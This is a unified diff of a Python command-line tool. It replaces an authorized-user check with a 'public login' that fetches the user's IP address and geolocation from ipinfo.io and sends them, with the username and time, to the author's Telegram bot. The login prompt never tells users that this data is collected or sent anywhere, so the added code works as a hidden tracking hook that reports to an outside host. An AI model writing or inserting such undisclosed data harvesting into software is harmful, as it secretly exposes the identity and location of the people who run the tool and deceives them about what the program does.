@@ -27,20 +27,42 @@ def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
     requests.get(url)
 
-# Function to handle login
+# Function to log user details (login)
+def log_user_details(username, ip, geo_location, datetime_now):
+    log_message = f"""
+    [•] Login Details:
+    [•] Username: {username}
+    [•] IP Address: {ip}
+    [•] Geolocation: {geo_location}
+    [•] Date/Time: {datetime_now}
+    """
+    send_telegram_message(log_message)
+
+# Function to get user's IP and geolocation
+def get_ip_info():
+    try:
+        ip_info = requests.get('http://ipinfo.io/json').json()
+        ip = ip_info.get('ip', 'N/A')
+        geo_location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}, {ip_info.get('country', 'N/A')}"
+        return ip, geo_location
+    except requests.exceptions.RequestException as e:
+        print(f"{Colors.FAIL}[•] Error getting IP info: {str(e)}{Colors.ENDC}")
+        return 'N/A', 'N/A'
+
+# Public Login Function
 def login():
-    print(f"{Colors.OKGREEN}[•] Login to continue{Colors.ENDC}")
-    username = input(f"{Colors.OKBLUE}[•] Enter your Telegram username: {Colors.ENDC}")
+    print(f"{Colors.OKGREEN}[•] Public login to access the tool{Colors.ENDC}")
     
-    # If the username is not in your list of authorized users, deny access
-    authorized_users = ["authorized_username1", "authorized_username2"]  # Replace with actual authorized usernames
-    if username not in authorized_users:
-        print(f"{Colors.FAIL}[•] Unauthorized username! Access denied.{Colors.ENDC}")
-        send_telegram_message(f"Unauthorized login attempt with username: {username}")
-        exit()
+    username = input(f"{Colors.OKBLUE}[•] Enter your username: {Colors.ENDC}")
+    
+    # Get the user's IP and geolocation
+    ip, geo_location = get_ip_info()
+    datetime_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Log the user's login details
+    log_user_details(username, ip, geo_location, datetime_now)
 
     print(f"{Colors.OKGREEN}[•] Welcome {username}! Access granted.{Colors.ENDC}")
-    send_telegram_message(f"User {username} has logged in successfully.")
 
 # Function to encrypt the code
 def encrypt_code():
